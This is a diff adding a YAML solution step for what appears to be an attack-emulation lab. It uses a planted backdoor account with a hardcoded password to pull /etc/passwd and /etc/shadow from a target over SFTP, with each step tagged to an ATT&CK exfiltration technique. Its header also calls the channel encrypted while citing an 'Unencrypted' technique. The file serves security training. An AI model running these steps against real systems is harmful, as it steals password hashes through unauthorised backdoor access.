@@ -1,0 +1,54 @@
+# Phase 7 SOLUTION: Exfiltration - SFTP Download
+#
+# Downloads /etc/passwd and /etc/shadow from the target to a local temp directory
+# using SFTP (SSH File Transfer Protocol). This represents exfiltration over an
+# encrypted channel using legitimate credentials.
+#
+# Variables required: $TARGET (and valid SSH credentials from a prior phase)
+# Variables set:      $EXFIL_DIR
+# ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol: Unencrypted Non-C2)
+#
+# NOTE: Uses the backdoor user account created in the persistence phase.
+# Adjust username/password if using different credentials (e.g., msfadmin).
+
+commands:
+  # Create a local temporary directory to hold the exfiltrated files
+  - type: mktemp
+    cmd: dir
+    variable: EXFIL_DIR
+
+  - type: debug
+    cmd: "Exfiltrating files to local directory: $EXFIL_DIR"
+
+  # Download /etc/passwd via SFTP
+  - type: sftp
+    cmd: get
+    hostname: $TARGET
+    username: backdooruser
+    password: Passw0rd123
+    remote_path: /etc/passwd
+    local_path: $EXFIL_DIR/passwd
+    metadata:
+      tactic: "TA0010"
+      technique: "T1048.003"
+      technique_name: "Exfiltration Over Alternative Protocol"
+
+  # Download /etc/shadow via SFTP
+  - type: sftp
+    cmd: get
+    hostname: $TARGET
+    username: backdooruser
+    password: Passw0rd123
+    remote_path: /etc/shadow
+    local_path: $EXFIL_DIR/shadow
+    metadata:
+      tactic: "TA0010"
+      technique: "T1048.003"
+      technique_name: "Exfiltration Over Alternative Protocol"
+
+  # Verify the files were downloaded
+  - type: shell
+    cmd: ls -la $EXFIL_DIR/
+
+  - type: debug
+    cmd: "Exfiltration complete. Files saved in $EXFIL_DIR"
